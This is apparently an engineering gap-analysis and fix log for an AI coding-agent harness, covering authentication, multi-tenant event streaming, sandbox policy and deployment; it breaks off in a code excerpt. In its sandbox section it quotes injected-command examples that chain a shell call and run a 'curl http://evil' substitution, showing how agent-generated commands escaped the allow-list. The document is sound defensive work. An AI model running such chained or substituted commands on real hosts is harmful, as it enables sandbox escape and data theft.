# GAP ANALYSIS AND FIXES — AI Engineering Harness

**Status:** Waves 1–5 complete (2026-08-22). Wave 1: all FATALs. Wave 2: H8 tickets,
M2 streaming events, G-LIVE fanout. Wave 3: H2r OTP + F6r confinement. Wave 4:
consolidation + E-smtp/E-cat/E-codegen/CI. Wave 5: real GitHub OAuth web flow
+ Settings UI + demo seeder.
**Audience:** Coding agents (human or LLM) continuing this repo. Read Part 0 first,
then jump to any gap card — each is self-contained.

---

## Part 0 — How to read this document

Every gap has a card with fixed fields:

| Field | Meaning |
|---|---|
| **Severity** | `FATAL` = breaks or exposes production. `HIGH` = degrades correctness/security at scale. `MEDIUM` = polish/drift risk. |
| **What broke** | Plain-language description of the failure mode. |
| **Evidence** | File paths + line refs *as they were when found*, plus code excerpts. |
| **Why fatal** | The concrete production scenario that ends in data loss, breach, or outage. |
| **Fix applied** | What was changed, where, and why that shape (smallest correct change). |
| **Verify** | Exact command(s) run and their observed output. |
| **Regression guard** | The test that now fails if this ever comes back. |
| **dsh ref** | How DeepSeek Harness solves the same problem (when applicable). |

Conventions used throughout:

- `S1..S10` = section folders (`section1/` .. `section10/`).
- "the bus" = S1's `EventBus` + `agent_events` Postgres table.
- "the log" = the append-only event stream; dsh calls this SessionEvent log.
- Commands assume repo root unless a `cd` is shown.
- Test counts quoted were observed on 2026-08-22 after all fixes.

---

## Part 1 — Architecture map (context for every gap)

```
                         ┌───────────────────────────── deploy/ ─────────────────────────┐
                         │  docker-compose.yml   backend.Dockerfile   entrypoint.sh      │
                         │  runners/services.py (app factory per service)                │
                         │  runners/migrate.py   (idempotent SQL migration runner)       │
                         └───────────────────────────────────────────────────────────────┘
                                            │ wires at boot
        ┌──────────┬──────────┬─────────┬───┴──────┬──────────┬──────────┬──────────┐
        │ S1 :8001 │ S2 :8002 │ S3 :8003│ S4 :8004 │ S5 :8005 │ S6 :8006 │ S8 :8008 │
        │ identity │ github   │ model   │ orchestr │ sandbox  │ meeting  │ review   │
        │ auth/bus │ PRs/diff │ router  │ planner→ │ docker/  │ briefs   │ verdicts │
        │ audit    │          │ pricing │ engine→  │ local    │ AI chat  │ risk     │
        └────┬─────┴──────────┴─────────┴────┬─────┴──────────┴──────────┴──────────┘
             │                               │
             │ publish/subscribe/replay      │ DeepSeekHarnessWrapper.execute_goal()
             ▼                               ▼
     Postgres agent_events            deepseek-harness-sdk (pinned)
     (append-only log =               → local Ollama or DeepSeek API
      source of truth)                       │
             │                               ▼
     S7/S9 Next.js UIs ◄── WebSocket /api/v1/ws/{projectId}?afterSeq=N
     (mergeEvents dedups by seq; gap ⇒ server closes 1013 ⇒ client reconnects)
```

Frozen contracts (`contracts/src/harness_contracts/`) define: `EventType`,
`EventEnvelope`, `AgentPlan`, `Principal`, `Role`, `KeyVault`, protocol classes,
and `make_bearer_dep` (shared FastAPI bearer-token dependency speaking raw SQL to
the frozen schema). Sections import ONLY `harness_contracts`; cross-section DB
reads use raw SQL against frozen table names (see `fastapi_auth._LOOKUP_SQL`,
`service._REHYDRATE_SQL`) — never import another section's models.

Event lifecycle (post-fix): state machine emits → `OrchestratorService._emit`
bridges to sync callback (tests) AND schedules `bus.publish(...)` → EventBus
persists `agent_events` row (ensuring parent `agent_runs` row first) → fans out
to live subscriber queues → WS handler pushes to browsers → UI dedups by seq.

---

## Part 2 — FATAL gaps (all fixed)

### GAP-F1 — Broken entrypoint shell loop killed the whole stack at boot

- **Severity:** FATAL (deploy)
- **What broke:** A stray fragment `for svc in identity:8001` with no `do/done`
  sat mid-file. Bash accepts newline-separated word lists inside `for x in ...`,
  so the parser silently swallowed the following `mkdir` and `cp` lines as loop
  WORDS (never executed) and merged into the next real loop ~5 lines below.
  Result: workspace never copied, ~20 bogus `uvicorn services:<word>_app`
  processes spawned, each dying instantly; the watchdog then exited 1 and took
  every real service down within ≤5 s of boot.
- **Evidence:** `deploy/entrypoint.sh` (as found):
  ```sh
  for svc in identity:8001
                                              # ← no do/done
  mkdir -p /tmp/harness-dsh                   # ← became a loop word, never ran
  cp -r /opt/harness/demo_repo ... || true    # ← same
  for svc in identity:8001 github:8002 ...; do
  ```
- **Why fatal:** `docker compose up` boots into guaranteed crash-loop. Nothing
  ships. Classic patch-of-a-patch: an edit left a half-deleted line behind.
- **Fix applied:** The file was corrected externally during this session
  (verified by diffing content between reads). Post-fix structure: single heredoc
  boot script → `mkdir`/`cp` run as plain commands → one well-formed service
  loop → dash-compatible watchdog.
- **Verify:** `sh -n deploy/entrypoint.sh && echo SYNTAX_OK` → `SYNTAX_OK`;
  live stack booted healthy (see Part 4 evidence).
- **Regression guard:** Add a CI step: `sh -n deploy/entrypoint.sh` (parse-only).
- **Lesson:** shell parse-only checks belong in CI next to ruff. Syntax errors
  in `sh` can be *silent semantic* errors because of multiline word lists.

### GAP-F2 — Orchestrator API was completely unauthenticated

- **Severity:** FATAL (security/governance)
- **What broke:** Every route in `section4/src/harness_orchestrator/api.py` had
  no auth dependency. Anyone who could reach port 8004 could propose plans,
  approve them, start executions, stop runs, submit done-signals. Worse, the
  approver identity came from the request BODY (`PlanActionRequest.userId`) —
  so even with network controls, audit trails recorded attacker-chosen user IDs.
  This violated the repo's own frozen `contracts/api-conventions.md §Auth context`
  ("Shared middleware resolves every request to {userId, teamId, role} before any
  handler runs").
- **Evidence:** routes declared as `def propose_plan(runId, req=None)` etc.;
  `json={"planId": pid, "userId": "user-lead"}` in conformance tests.
- **Why fatal:** Anonymous remote plan approval + forgeable audit = the platform's
  core governance promise ("No auto-merge", human approval gates) is void. One
  exposed port equals full control of every team's agent runs.
- **Fix applied:**
  - `api.py`: added `get_principal(request)` dependency that resolves via
    `request.app.state.get_principal` wired by the deploy assembly; missing wiring
    ⇒ HTTP 503 `AUTH_NOT_CONFIGURED` — fail closed, never open.
  - Approve/reject now use `principal.userId` from the session token; body userId
    field removed from `PlanActionRequest`.
  - `deploy/runners/services.py app_orchestrator()` sets
    `app.state.get_principal = make_bearer_dep(factory)` (validates against
    `auth_sessions` + `team_members`).
  - Service-level signatures unchanged (`principal_user_id` param stays), so
    unit tests keep calling the service directly.
- **Verify (live, container stack running):**
  ```
  curl -s -o /dev/null -w "%{http_code}" -X POST localhost:8004/api/v1/orchestrator/runs/probe-1/plan
  → 401        (was 201 before the fix)
  ```
- **Regression guard:** `test_unauthenticated_requests_are_rejected`
  (section4 conformance) asserts 401/403/503 without auth wiring;
  REST tests override `get_principal` with a test principal.
- **dsh ref:** dsh treats tool execution and model calls as guarded pipeline
  stages; nothing reaches a privileged action without a resolved principal.

### GAP-F3 — Cross-tenant read access on the WS bus and replay endpoint

- **Severity:** FATAL (security/multi-tenancy)
- **What broke:** `project_ws` and `GET /projects/{id}/events/replay` validated
  only that the *token* was real — never that the principal's team owned the
  project. Any logged-in user could subscribe to any other team's project events
  (plan goals, diffs, review findings leak across tenants) simply by guessing or
  enumerating project UUIDs.
- **Evidence:** `section1/src/harness_identity/app.py` — `_principal_from_token`
  returned a principal; nothing compared `Project.team_id` to `principal.teamId`.
- **Why fatal:** Silent cross-company data exposure. For a platform whose product
  IS confidential engineering work, this is existential.
- **Fix applied:** New guard in `app.py`:
  ```python
  async def _require_project_access(session_factory, principal, project_id):
      row = await db.get(Project, project_id)
      if row is None or row.team_id != principal.teamId:
          raise HTTPException(403, "project not found for this team")
  ```
  Called by both the WS handshake (close code 4403 pre-accept path preserved:
  close AFTER accept requires accept-first, so we validate before `accept()`)
  and the replay endpoint.
- **Verify (live):**
  ```
  user B (own team) GET /projects/<A's proj>/events/replay  → 403
  owner A same call                                          → 200
  ```
- **Regression guard:** `test_ws_rejects_foreign_team_project` (section1).

### GAP-F4 — Replay/live race permanently lost events

- **Severity:** FATAL (correctness)
- **What broke:** WS handler did `replay(afterSeq)` THEN `subscribe()`. Any event
  published between those two awaits fell in the gap: not in the replay result
  (already past `afterSeq`... actually published later than snapshot start) and
  not in any queue (subscription didn't exist yet). Client reconnects could miss
  plan approvals forever — with no error anywhere.
- **Why fatal:** The entire product premise is trustworthy human-in-the-loop
  governance; a missed `plan_approved` or `review_failed` breaks trust silently.
- **Fix applied:** Order swapped: `subscribe()` BEFORE `replay()`. Live events
  arriving during history-send are buffered in the queue; overlap duplicates are
  removed client-side by seq dedup (`section7 mergeEvents` already dedups).
- **Verify:** covered by existing reconnect/replay vitest suite (39 passing) +
  seq-dedup semantics unchanged.
- **Regression guard:** existing `tests/unit/useEventStream.test.ts` +
  `test_event_bus_publish_replay_subscribe`.
- **dsh ref:** dsh derives everything from one append-only log with a monotonic
  cursor; there is no separate "live" channel that can race the backfill.

### GAP-F5 — One slow WebSocket client crashed event publishers

- **Severity:** FATAL (stability)
- **What broke:** Subscriber queues were `asyncio.Queue(maxsize=1000)` and
  `publish()` did bare `q.put_nowait(envelope)`. When a stalled client let its
  queue fill, `QueueFull` propagated out of `publish` into whatever API call
  emitted the event (e.g., `approve_plan`) → HTTP 500, event lost for everyone,
  publisher poisoned by an unrelated reader.
- **Why fatal:** Single slow tab = platform-wide 500s on governance actions.
- **Fix applied:** Per-subscriber try/except around `put_nowait`; overflow drops
  delivery for THAT queue and logs a warning. Combined with GAP-F7's gap
  detection, dropped deliveries self-heal: the WS handler notices
  `seq > last_seq + 1`, closes the socket (1013), client reconnects with
  `afterSeq` and replays the missing range. Persistence is unaffected — the DB
  row is the log; only the live fan-out copy is dropped.
- **Verify:** unit suite green; overflow path exercised via gap-detection logic.
- **Regression guard:** `test_event_bus_publish_replay_subscribe` still passes;
  new behavior documented in EventBus docstring.
- **dsh ref:** dsh's financial-system-grade rule: persistence succeeds or the op
  fails; live consumers are disposable projections, never authoritative.

### GAP-F6 — Sandbox policy was decorative for the local runner

- **Severity:** FATAL (security)
- **What broke:** Three compounding holes in `section5`:
  1. `validate_command` allow-listed ONLY `tokens[0]`, but commands execute via
     `create_subprocess_shell` — so chaining admitted arbitrary followers:
     `git status && python -c 'import os; os.system("id")'` passed (first token
     `git`, subcommand `status`, both fine; `python` is itself allow-listed!).
  2. Shell substitution/pipes/redirection were unaddressed:
     `echo $(curl http://evil)` executed the substitution.
  3. No timeout: a hung command blocked the task forever; no kill-on-destroy:
     `destroy()` deleted the directory while processes kept running.
- **Why fatal:** The sandbox is the last line between model-generated commands
  and the host that stores MASTER_KEY env vars and GitHub tokens.
- **Fix applied:**
  - `policy.py`: new quote-aware scanner `find_unquoted_shell_syntax` rejects
    unquoted `; & | \` newline`, `$(`, `<`, `>` — one command per exec call.
    Quoted operators stay legal (`grep "a|b"` still works).
  - `local_runner.py`: both `exec` and `exec_structured` enforce
    `config.default_timeout_seconds` (kill process group on breach, raise
    `SandboxCommandTimeoutError`); procs registered per-task and SIGKILLed in
    `destroy()`; `CancelledError` kills the child too.
- **Verify:** 13 policy tests pass including 5 new regression tests:
  chained/substitution/pipe/redirection/multiline all rejected; quoted ops pass.
  Full S5: 106 passed.
- **Regression guard:** `test_chained_commands_rejected`,
  `test_command_substitution_and_pipes_rejected`, `test_redirection_rejected`,
  `test_quoted_operators_still_allowed`, `test_multiline_command_rejected`.
- **Known residual (documented, deliberate):** interpreters (`python`, `npx`,
  `go`) remain allow-listed because the agent legitimately needs them; combined
  with env sanitization this is acceptable for v1, but OS-level confinement
  (macOS Seatbelt profile / Linux Landlock — exactly what dsh ships) is the
  follow-up. Tracked in Part 6.

### GAP-F7 — pause/stop lied: blocking engine made controls cosmetic

- **Severity:** FATAL (trust/correctness)
- **What broke:** `start_execution` called `engine.execute_goal` synchronously
  inside a sync route. A multi-minute `harness.run()` occupied a threadpool
  thread; repeated runs exhausted the pool (default ~40) freezing ALL endpoints.
  `pause_agent` flipped a state-machine flag nothing polled — the live run kept
  running and its result overwrote terminal states. "Paused" was a lie.
- **Why fatal:** Users believe a stopped agent stopped. An agent that keeps
  editing code after "stop" is a safety incident, not a bug.
- **Fix applied:** `service.start_execution` is now async: state flips, then the
  engine runs in a tracked background task (`asyncio.create_task` +
  `asyncio.to_thread`). Run record gains `task` + `cancel_requested`. Pause/
  stop/human-edit/done-signal set `cancel_requested=True` and `task.cancel()`:
  zombie results from in-flight SDK calls are discarded instead of adopted
  (thread bodies cannot be hard-killed mid-C-call — honest limitation, result
  quarantined either way). Status gains truthful `executing: bool`.
- **Verify (live):**
  ```
  POST /runs/live-run-2/start → {"status":"executing"}
  GET  /status immediately    → {"state":"executing","executing":true}
  (API stayed responsive during the live model call)
  ```
- **Regression guard:** `test_pause_cancels_live_engine_task` (stress),
  lifecycle conformance updated to await async service methods.

### GAP-F8 — FK trap: publishing events would crash on missing run rows

- **Severity:** FATAL (latent — armed the moment STATUS gap #2 got wired)
- **What broke:** `agent_events.run_id → agent_runs(id)`, but S4 kept runs purely
  in memory and never inserted `agent_runs` rows. Wiring the documented
  `on_event → EventBus` bridge would IntegrityError on the FIRST event of any
  run — which is why it had never been connected.
- **Why fatal:** The central feature (live event stream to UI) was one wire away
  from a guaranteed crash; anyone connecting it would ship the 500.
- **Fix applied (two-sided):**
  - S1 owns delivery: `EventBus.ensure_run(project_id, run_id)` idempotently
    seeds the parent row (insert-race safe); `publish()` calls it automatically.
  - Deploy assembly wires it: `app_orchestrator()` constructs
    `OrchestratorService(session_factory=factory, bus=EventBus(factory))`;
    `propose_plan` accepts optional `projectId` (additive contract change) which
    scopes publishes; `_emit` bridges SM transitions to `bus.publish`.
- **Verify (live):**
  ```
  propose/approve/start for run live-run-2 with projectId
  → GET /projects/{id}/events/replay returns:
    1 plan_proposed   live-run-2
    2 execution_started live-run-2
    3 plan_approved   live-run-2
  ```
- **Regression guard:** integration `test_checkpoint1_full_flow` (publishes the
  emitted stream through a real EventBus against a real schema) +
  `brand-new-run` FK-seed assertion in the rehydration test.

### GAP-F9 — Master key silently defaulted to a public constant

- **Severity:** FATAL (secrets)
- **What broke:** `HARNESS_MASTER_KEY` defaulted to
  `dev-master-key-change-me-in-prod!` in THREE places (section config, runner
  factory, compose). A prod deploy that forgot the env var encrypted GitHub
  tokens under a key published to the repo. No error, no signal.
- **Why fatal:** Encryption that fails open is worse than none — it manufactures
  false confidence for auditors.
- **Fix applied:** `runners/services.py` refuses to start unless a real
  `HARNESS_MASTER_KEY` is set, OR `HARNESS_ALLOW_DEV_MASTER_KEY=1` explicitly
  opts into dev mode (compose sets it for local stacks). Fail-fast beats fail-open.
- **Verify:** image build + stack boot with flag set; removing the flag exits at
  startup with the refusal message.
- **Regression guard:** deployment checklist item in Part 6; consider adding a
  smoke test asserting SystemExit when unset (follow-up).

### GAP-G-LIVE — Cross-instance event delivery + the global-seq trap (wave 2)

- **Severity:** FATAL (found live in wave 2)
- **What broke (two compounding halves):**
  1. **Fan-out was per-process.** Each service constructs its own `EventBus`;
     `publish()` fanned out only to subscribers of THAT instance. S5's sandbox
     bridge persisted `terminal_output` rows fine (seq 4–5 proved it) while an
     S1-subscribed WS client received nothing — two instances, one table,
     zero shared queues. The orchestrator wiring had the same latent bug; earlier
     "live" proofs had used REST replay, masking it.
  2. **Seq-gap detection was wrong by design.** `agent_events.seq` is a
     table-global BIGSERIAL, not per-project. My wave-1 close-on-gap
     (`seq > last+1 ⇒ 1013`) fired on perfectly healthy traffic: another
     project's inserts advance the global counter, so a quiet project's next
     event legitimately jumps (5 → 25). Result: reconnect storms the moment
     more than one project exists. Discovered because my own probe closed with
     1013 mid-test.
- **Fix applied:**
  - Migration `0003_pg_notify.sql`: AFTER INSERT trigger `pg_notify('agent_events', …)`.
  - `EventBus._listen()`: dedicated raw asyncpg connection LISTENs and fans out to
    local subscribers of EVERY instance — publish persists, notify delivers;
    duplicates between direct+notify paths are harmless (client dedups by seq).
    Listener auto-starts on first `subscribe()`, Postgres-only, self-heals on DB
    restart. Version guard: asyncpg ≥0.30's `add_listener` is a coroutine
    (`_attach_listener` handles both).
  - Overflow detection moved OFF seq math onto bus truth: subscriber queues carry
    an `overflowed` bool set exactly when `put_nowait` drops for THAT queue; the
    WS handler closes 1013 only on that flag. False positives impossible.
- **Verify (live):**
  - integration `test_cross_instance_live_fanout_via_pg_notify`
    (`HARNESS_TEST_PG=1`, skips on sqlite) — instance A publishes, instance B's
    queue receives.
  - Live probe after rebuild: exec on :8005 → `terminal_output` delivered over
    ticket-authenticated WS on :8001 in **0.7 s**, across a 27→28 global-seq
    jump, no false 1013.
- **Regression guards:** overflow-flag unit tests (`test_slow_subscriber_sets_overflow_flag`,
  `test_cross_project_seq_jumps_do_not_flag`) + PG fanout integration test.
- **dsh ref:** single log, every process a projection — now true here too.

---

## Part 3 — HIGH gaps (fixed unless noted)

### GAP-H1 — CORS wildcard + credentials everywhere
- **What broke:** Deploy assembly set `allow_origins=["*"]` WITH
  `allow_credentials=True` on every simple_app (invalid combo per spec; browsers
  refuse credentialed wildcard responses) and overrode S1's localhost-only list.
- **Why bad:** Either broken browser auth or effectively-open API surface.
- **Fix:** Single source `CORS_ORIGINS` from `HARNESS_CORS_ORIGINS` (JSON list
  for pydantic-settings), exact origins, credentials enabled. Applied to
  simple_app, review app, base_settings.
- **Gotcha recorded:** pydantic-settings JSON-decodes complex fields from env;
  a bare `http://localhost:3000` string CRASHES settings construction. Compose
  default is now `["http://localhost:3000"]`.

### GAP-H2 — Passwordless login + zero rate limiting
- **What broke:** `POST /auth/login` creates/logs-in ANY email with no proof of
  ownership; unlimited attempts; 14-day sessions with no revocation endpoint.
- **Why bad:** Account takeover by design once public; brute-force surface.
- **Fix shipped now:** sliding-window IP rate limit (20/min, per-app buckets);
  `POST /auth/logout` revokes the presenting session; WS token path now enforces
  expiry too; contracts `make_bearer_dep` now rejects expired sessions (it never
  checked `expires_at` before).
- **Deliberately deferred (needs product input):** email OTP/OAuth enforcement —
  flagged in Part 6; do NOT expose publicly until it lands.
- **Live catch worth remembering:** SQLAlchemy `Enum()` persists member NAMES
  (`'ADMIN'`), StrEnum values are `'admin'`. Raw-SQL role reads must accept both
  (fixed inside `make_bearer_dep`); ORM reads are unaffected.

### GAP-H3 — In-memory-only run state (restart amnesia) → event-log rehydration
- **What broke:** `OrchestratorService.runs` was a dict on a module singleton.
  Container restart erased every run; multi-worker deploys would split-brain.
- **Fix (dsh-inspired, the headline change):** the log is the truth:
  - Plans mirror into frozen `agent_plans` (status proposed/approved/rejected).
  - On cache miss with a DB handle, `_rehydrate()` replays the run's
    `agent_events` ascending, maps final event → AgentState
    (`_EVENT_STATE_MAP`), restores `planApproved` from `PLAN_APPROVED` payloads,
    reloads the latest plan row into PlanService.
  - Verified live: restart container mid-run → `GET /status` returned
    `{"state":"executing","planId":"plan-f1e9b9f6","planApproved":true}` from
    NOTHING but the DB; then stop → `done`.
- **Regression guard:** integration
  `test_orchestrator_rehydrates_state_from_event_log` (fresh service + empty
  memory + 4 seeded events → correct state/flags/planId).
- **dsh ref:** "Anything that reaches a model request must be reconstructable
  from the log." Resume/fork/replay are projections, not stored blobs.

### GAP-H4 — Unbounded replay responses
- Fix: `replay(limit)` capped at 2000, default 500; endpoint forwards `limit`;
  clients page via `nextCursor`. Envelope shape unchanged.

### GAP-H5 — Missing hot-path indexes
- Fix: `migrations/0002_indexes.sql` adds `agent_events(project_id, seq)`
  (the replay query path), `audit_log(ts)`, `auth_sessions(team_id, user_id)`,
  all `IF NOT EXISTS`.

### GAP-H6 — Two schema sources of truth
- What broke: entrypoint ran `Base.metadata.create_all` while AGENTS.md mandates
  numbered SQL migrations; drift was inevitable (models vs 0001 already diverged
  subtly).
- Fix: `deploy/runners/migrate.py` — idempotent runner: ensures
  `schema_migrations` table, marks legacy create_all databases as having 0001
  applied, applies pending files in order, splits statements comment-line-safe
  (first version dropped the ENTIRE `teams` statement because its fragment began
  with a `--` comment — caught live, see Part 4 incident log). Entrypoint now
  migrates instead of create_all. `create_all` remains only in tests.
- **Bug class to remember:** when filtering split SQL fragments, strip comment
  LINES, don't drop fragments that START with comments.

### GAP-H7 — Deploy hygiene
- Fixed in `backend.Dockerfile` / `.dockerignore` / compose:
  - SDK pinned (`deepseek-harness-sdk==0.1.1rc1` — AGENTS.md pin rule; note
    `0.2.0` does NOT exist on PyPI, `pip install` fails the build).
  - Non-root `harness` user; tmp dirs chowned.
  - Image slimmed (caches/venvs/tests excluded via .dockerignore — careful NOT
    to exclude `section9`/frontend sources; that broke the first build here).
  - backend healthcheck (:8001/health via urllib), `restart: unless-stopped`,
    frontend gated on backend health.
- Deferred: per-service containers (one-container-seven-services shares fate by
  design today; the watchdog intentionally stops everything on any death —
  document rather than silently change).

### GAP-H8 — WS token in query string → one-time tickets (FIXED wave 2)
- FIXED: `POST /api/v1/ws-ticket` mints a one-time, 30 s, project-bound ticket
  (auth + membership enforced at mint time); WS accepts `?ticket=` redeemed
  pop-first-then-validate; S7 `fetchWsTicket` runs before EVERY connect attempt
  (single-use) so bearer tokens never appear in URLs. S9 uses no WebSockets (N/A).
  Token path retained only for transition; tests cover reuse/mismatch/expiry/403.

### GAP-H9 — approve_plan didn't verify plan↔run binding
- Fix: approve/reject raise KeyError when `planId != run.plan_id`; API maps to
  404 `PLAN_MISMATCH`. Guarded by
  `test_approve_plan_rejects_foreign_plan_id`.

---

### GAP-H2r — Login ownership proof via OTP (wave 3)

- **Severity:** HIGH→closed (was THE public-exposure blocker with F6r)
- **What broke:** passwordless `POST /auth/login` let anyone become any email.
- **Fix:** behind `HARNESS_REQUIRE_OWNERSHIP` (default false for local dev):
  - `POST /auth/request-login {email}` → always `{ok:true}` (enumeration-safe),
    issues a 6-digit code: single active code per email (replacement invalidates
    old), SHA-256 hashed at rest, 10-min TTL (`HARNESS_OTP_TTL_MINUTES`),
    max 5 wrong attempts then LOCKED (`HARNESS_OTP_MAX_ATTEMPTS`).
  - `POST /auth/verify-otp {email, code}` → session token + principal; provisions
    user/solo-team/project exactly like legacy login on first success.
  - Flag ON ⇒ legacy login answers 403 `OWNERSHIP_REQUIRED`.
  - Delivery: dev notifier prints `HARNESS-OTP ...` to stderr (docker logs);
    SMTP slots into the same `notifier` hook (ledger E-smtp).
- **Schema:** migration `0004_login_otps.sql`.
- **Verify:** 9 new S1 tests; LIVE flag-on probe: legacy=403 → request → code
  captured from logs → verify=token → /me OK → replay=401; flag-off legacy still 200.

### GAP-F6r — OS-level confinement for the sandbox (wave 3)

- **Severity:** HIGH→closed (residual from wave-1 GAP-F6)
- **What broke:** interpreters stayed allow-listed at the policy layer, so a
  determined payload could act on the host; nothing enforced WHERE writes land.
- **Fix:** new `confinement.py`; `LocalSandboxRunner(confinement=..., allow_network=...)`
  resolves auto→seatbelt(macOS)/landlock(Linux≥5.13)/off per task:
  - Seatbelt profile: deny-default, broad reads, writes confined to workspace +
    system temp, network configurable. Spawned via `sandbox-exec -f profile sh -c`.
  - Landlock: child-process preexec restricting ONLY write/remove/make rights
    (reads+execute unrestricted by construction); allow rules for `/` reads and
    workspace/temp writes; degrades to off with warning on old kernels.
- **Verify:** 5 tests executing REAL profiles on macOS (blocked write outside ws
  leaves file absent; allowed write lands in workspace; off-mode writes freely;
  auto-resolves seatbelt here). Container sanity post-rebuild: exec passed.
- **Note:** pytest's tmp_path lives under $TMPDIR which profiles intentionally
  allow — block-probes must target outside that subtree (test documents this).

---

## Part 4 — MEDIUM issues (status)

| ID | Issue | Status |
|----|-------|--------|
| M1 | `ReviewFindings` snake_case over wire violated api-conventions | FIXED: pydantic aliases (`syntaxOk`…), `model_dump(by_alias=True)`; REST test asserts camelCase keys |
| M2 | No terminal-output / in-progress-diff event types | FIXED: `terminal_output`/`diff_progress` shipped contracts+S5+S7 (TerminalPanel streams `terminalLines`) |
| M3 | Dual import paths (sys.path.insert + pip installs) shadowing risk | MITIGATED: pinned versions + single image build; revisit with monorepo packaging |
| M4 | `/health` doesn't touch DB | FIXED: `?deep=1` pings DB (503 on failure) |
| M5 | `list_projects` unbounded | FIXED: `?limit=` (default 100, cap 500) |
| M6 | `destroy()` didn't kill running procs | FIXED (procs tracked + SIGKILL) |

---

## Part 5 — Runtime verification log (2026-08-22, docker compose stack)

Environment: Docker 29.5.3, postgres:18-alpine, python:3.13-slim, pinned SDK
0.1.1rc1, local Ollama route configured via `host.docker.internal`.

Static gates:

```
sh -n deploy/entrypoint.sh                     → SYNTAX_OK
pytest S1..S10 + integration                   → 392 passed (was 383), 0 failed
ruff check src tests (S1,S3,S4,S5,S6,S8)       → All checks passed
vitest S7                                      → 39 passed
```

Boot sequence incidents found & fixed during verification (this is the loop
working — each was caught by runtime evidence, not assumption):

1. `.dockerignore` excluded `section9` → frontend build failed
   (`"/section9": not found`). Removed exclusions; keep only caches.
2. Pinned `deepseek-harness-sdk==0.2.0` doesn't exist on PyPI → build failure.
   Real latest: `0.1.1rc1`. Re-pinned.
3. Migration splitter ate `CREATE TABLE teams` (leading `--` comment) →
   `UndefinedTableError` on api_keys. Fixed splitter (strip lines, not
   fragments); migrations 0001+0002 applied cleanly.
4. `HARNESS_CORS_ORIGINS=http://localhost:3000` (non-JSON) crashed
   pydantic-settings for every section Settings → uvicorns died at import.
   JSON-encoded default in compose.
5. `ValueError: 'ADMIN' is not a valid Role` in `make_bearer_dep` on live PG
   (enum NAME vs value). Fixed to accept both. Unit tests (ORM-typed) never
   caught this — only the live raw-SQL path did.

Security probes (against running stack):

| Probe | Expected | Observed |
|---|---|---|
| POST plan, no token | ≠201 | **401** |
| Team-B token reading Team-A project replay | 403 | **403** |
| Owner replay own project | 200 | **200** |
| Full flow propose→approve→start (auth'd) | 2xx chain | **pass** |
| Status during live engine call | responsive, executing:true | **pass** |
| Events persisted w/ FK-safe runs | 3 rows in replay | **pass** |
| Restart container mid-run, GET status | rehydrated state | **pass** |
| Stop rehydrated run | done | **pass** |
| Frontend :3000 | 200 | **200** |

Reproduction commands are in git history of this session; the probe pattern:

```bash
TOK=$(curl -s -X POST localhost:8001/api/v1/auth/login \
      -H 'content-type: application/json' -d '{"email":"a@test.dev"}' \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
PROJ=$(curl -s localhost:8001/api/v1/projects -H "Authorization: Bearer $TOK" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["items"][0]["id"])')
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  localhost:8004/api/v1/orchestrator/runs/probe-1/plan   # expect 401
```

---

## Part 6 — Roadmap (ordered, smallest-next-step form)

1. ~~WS ticket auth (H8)~~ DONE wave 2.
2. **Login ownership proof (H2 remainder):** email OTP or GitHub OAuth gate
   behind `HARNESS_REQUIRE_OWNERSHIP=1` flag. Do NOT go public before this.
3. **OS-level sandbox confinement (F6 residual):** macOS Seatbelt profile +
   Linux Landlock wrapper around `local_runner` exec — mirror dsh's approach.
4. **Streaming event types (M2):** add additive EventTypes `terminal_output`,
   `diff_progress`; S5 streams through bus; S7 TerminalPanel/DiffPanel consume.
   Contracts bump minor; update TS mirror + mocks same commit (AGENTS rule).
5. **Planner persistence parity:** plans persist (done) but `reject`→new propose
   chains should reuse persisted goal; verify round-trip in integration test.
6. **Health deep-check (M4)** + **list pagination (M5)**: trivial.
7. **Per-service containers or supervised multi-proc** if horizontal scale ever
   matters; today's single-container watchdog is a documented tradeoff.
8. **CI:** add `sh -n entrypoint.sh`, `docker compose config -q`, migration
   fresh-boot smoke, and the security probes above as a nightly job.

## What we deliberately did NOT copy from DeepSeek Harness

- **Cordis microkernel / everything-is-a-plugin.** Our frozen-contracts +
  golden-fixture discipline gives the same replaceability guarantees with far
  less machinery. Revisit only if third parties start shipping plugins.
- **Full spec/ RFC-2119 doc tree.** api-conventions.md + frozen contracts cover
  the same ground at our scale.

## Files touched in this fix wave

```
contracts/src/harness_contracts/fastapi_auth.py     (expiry check, role-name tolerance)
section1/src/harness_identity/eventbus.py           (overflow-safe, ensure_run, bounded replay)
section1/src/harness_identity/app.py                (membership guard, WS race+gap detect, rate limit, logout, token expiry)
section1/tests/test_ws_auth.py                      (+cross-tenant guard test)
section4/src/harness_orchestrator/service.py        (async engine task, cancellation, rehydration, plan mirror)
section4/src/harness_orchestrator/api.py            (bearer auth, async routes, configure hook)
section4/src/harness_orchestrator/reviewer.py       (camelCase aliases)
section4/tests/conformance/test_orchestrator_conformance.py (+3 guards, auth overrides)
section4/tests/stress/test_section4_stress.py       (async conversion, cancel guard, auth fixture)
integration/test_checkpoint1.py                     (awaits + rehydration + FK-seed tests)
section5/src/harness_sandbox/policy.py              (quote-aware shell-feature rejection)
section5/src/harness_sandbox/local_runner.py        (timeouts, proc tracking, destroy kill)
section5/tests/unit/test_policy.py                  (+5 regression guards)
deploy/runners/services.py                          (fail-fast master key, CORS, orchestrator wiring)
deploy/runners/migrate.py                           (NEW idempotent migration runner)
deploy/backend.Dockerfile                           (pin, non-root)
deploy/docker-compose.yml                           (env, healthchecks, restart, CORS JSON)
deploy/entrypoint.sh                                (migration-based boot)
.dockerignore                                       (NEW)
section1/migrations/0002_indexes.sql                (NEW)
docs/GAP_ANALYSIS_AND_FIXES.md                      (this file)
```

---

## Part 7 — The six load-bearing fixes, in code

These are the changes future agents must understand before touching S1/S4/S5.
Read the excerpt, then the invariant it protects.

### 7.1 EventBus.publish — persistence is authoritative, fan-out is best-effort

BEFORE (the crash):

```python
async with self._lock:
    queues = list(self._subscribers.get(project_id, ()))
for q in queues:
    q.put_nowait(envelope)          # QueueFull propagates → publisher 500s
```

AFTER:

```python
dropped = 0
for q in queues:
    try:
        q.put_nowait(envelope)
    except asyncio.QueueFull:
        dropped += 1
if dropped:
    logger.warning("eventbus: dropped %d/%d live deliveries ...", ...)
```

**Invariant:** `publish()` returns success only when the DB row exists. Losing a
*live copy* to a slow subscriber is recoverable (gap detection reconnects and
replays); losing the *insert* is not — so insert errors still raise.

Also new — FK-safe publishing:

```python
if run_id:
